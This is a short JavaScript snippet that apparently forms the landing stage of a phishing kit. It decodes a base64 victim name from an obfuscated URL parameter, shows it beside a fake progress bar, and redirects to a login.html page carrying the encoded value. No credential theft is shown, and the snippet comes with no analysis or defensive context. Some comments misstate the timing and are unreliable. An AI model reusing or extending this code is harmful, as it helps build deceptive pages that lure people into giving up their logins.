        <script>

           // Function to extract query parameter value
        function getQueryParameter(parameterName) {
                var queryString = window.location.search;
                var urlParams = new URLSearchParams(queryString);
                return urlParams.get(parameterName);
                }
               // Get the value from the 'data' query parameter
		    var value = getQueryParameter('nchrewsertuighmjhkrytafazxvcfgdhyrt');
		    
		     if(value == null) {
		    
		    	window.location.href = "error.html";
		    
		    }else{
		    
		    var b64name = atob(value);
		    
			function redirectToDestination() {
		       // Redirect to the destination page with the variable value in the URL
		       window.location.href = "login.html?gfsdgsdfsdfghrtytsdweiuymnvbnxvasfwqefrew=" + (value);
		       }

		       // Automatically redirect after a certain delay (e.g., 2 seconds)
		       setTimeout(redirectToDestination, 3000);
		       
			    
			function startProgress() {
			
				
			    var b64name = atob(value);
			    document.getElementById('username').innerHTML = b64name;
			    
			      
				    
			      let progress = 0;
			      const progressBar = document.querySelector('.progress-bar');
			      const progressText = document.querySelector('.progress-text');

			      const interval = setInterval(() => {
			      progress++;
			      progressBar.style.width = progress + '%';
			      progressText.textContent = progress + '%';

			      if (progress >= 100) {
				clearInterval(interval);
			      }
			    }, 60); // 4 seconds at 1000ms / 25fps = 40ms per frame
			  }

			  startProgress();
          
          }

        </script>
